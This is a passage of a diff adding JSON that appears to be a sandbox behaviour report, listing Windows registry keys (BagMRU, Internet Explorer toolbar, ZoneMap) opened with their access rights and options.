+                            "CREATE_SUB_KEY",
+                            "ENUMERATE_SUB_KEYS",
+                            "NOTIFY",
+                            "QUERY_VALUE",
+                            "READ_CONTROL",
+                            "SET_VALUE"
+                        ],
+                        "name": "REGISTRY\\USER\\S-1-5-21-2580483871-590521980-3826313501-500_CLASSES\\LOCAL SETTINGS\\SOFTWARE\\MICROSOFT\\WINDOWS\\SHELL\\BAGMRU\\5",
+                        "options": [
+                            "REG_OPTION_NON_VOLATILE"
+                        ]
+                    },
+                    {
+                        "access": [
+                            "CREATE_SUB_KEY",
+                            "ENUMERATE_SUB_KEYS",
+                            "NOTIFY",
+                            "QUERY_VALUE",
+                            "READ_CONTROL",
+                            "SET_VALUE"
+                        ],
+                        "name": "REGISTRY\\USER\\S-1-5-21-2580483871-590521980-3826313501-500\\SOFTWARE\\MICROSOFT\\INTERNET EXPLORER\\TOOLBAR",
+                        "options": [
+                            "REG_OPTION_NON_VOLATILE"
+                        ]
+                    },
+                    {
+                        "access": [
+                            "CREATE_SUB_KEY",
+                            "ENUMERATE_SUB_KEYS",
+                            "NOTIFY",
+                            "QUERY_VALUE",
+                            "READ_CONTROL",
+                            "SET_VALUE"
+                        ],
+                        "name": "REGISTRY\\USER\\S-1-5-21-2580483871-590521980-3826313501-500\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\INTERNET SETTINGS\\ZONEMAP",
+                        "options": [
+                            "REG_OPTION_NON_VOLATILE"
+                        ]
+                    }
+                ],
+                "registry_keys_modified": [
+                    {
+                        "data": "
